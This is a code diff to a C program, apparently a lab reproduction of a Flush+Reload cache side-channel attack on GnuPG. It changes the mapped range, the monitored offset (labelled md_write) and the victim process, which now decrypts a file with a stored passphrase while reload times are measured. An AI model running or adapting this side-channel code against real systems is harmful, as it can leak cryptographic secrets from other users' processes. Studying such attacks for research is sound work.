@@ -33,7 +33,8 @@ void *map_gnupg() {
         return NULL;
     }
     
-    void *map = mmap(NULL, sysconf(_SC_PAGESIZE), 
+    // Map more of the binary to access functions at higher offsets
+    void *map = mmap(NULL, 0x200000,  // Map 2MB to cover the entire binary
                     PROT_READ, MAP_PRIVATE, fd, 0);
     close(fd);
     return map;
@@ -71,7 +72,7 @@ void baseline_test(void *target_addr, uint64_t *times, int *count) {
 }
 
 void attack_test(void *target_addr, uint64_t *times, int *count) {
-    printf("\n=== ATTACK TEST (With Victim Process) ===\n");
+    printf("\n=== ATTACK TEST (With Victim Process Decrypting) ===\n");
     printf("Flushing entire GnuPG library and monitoring...\n");
     
     int samples = (TEST_DURATION_SECONDS * 1000000) / SAMPLE_RATE_US;
@@ -100,11 +101,11 @@ void victim() {
     CPU_SET(1, &cpuset);
     pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
     
-    printf("Victim: Starting encryption on core 1\n");
+    printf("Victim: Starting decryption on core 1\n");
     
     // Run victim process for the duration of the attack test
     for (int i = 0; i < TEST_DURATION_SECONDS * 2; i++) {
-        system("echo 'test message' | /home/ev/genkin/flush_reload/gnupg-install/bin/gpg --encrypt --recipient test@test.com 2>/dev/null");
+        system("echo '' | /home/ev/genkin/flush_reload/gnupg-install/bin/gpg --batch --yes --passphrase-file /home/ev/genkin/flush_reload/passphrase.txt --decrypt /home/ev/genkin/flush_reload/test_encrypted.gpg 2>/dev/null");
         usleep(500000);  // 0.5 second intervals
     }
 }
@@ -132,7 +133,7 @@ void write_results(double baseline_avg, double attack_avg, int baseline_count, i
     fprintf(fp, "  Samples: %d\n", baseline_count);
     fprintf(fp, "  Average Reload Time: %.2f cycles\n\n", baseline_avg);
     
-    fprintf(fp, "Attack Test (With Victim):\n");
+    fprintf(fp, "Attack Test (With Victim Decrypting):\n");
     fprintf(fp, "  Samples: %d\n", attack_count);
     fprintf(fp, "  Average Reload Time: %.2f cycles\n\n", attack_avg);
     
@@ -166,7 +167,7 @@ int main() {
         return 1;
     }
     
-    void *target_addr = target + 0x000;  // Target offset in GnuPG
+    void *target_addr = target + 0x81330;  // Target offset in GnuPG (md_write function)
     
     printf("GnuPG mapped at %p, monitoring at %p\n", target, target_addr);
     
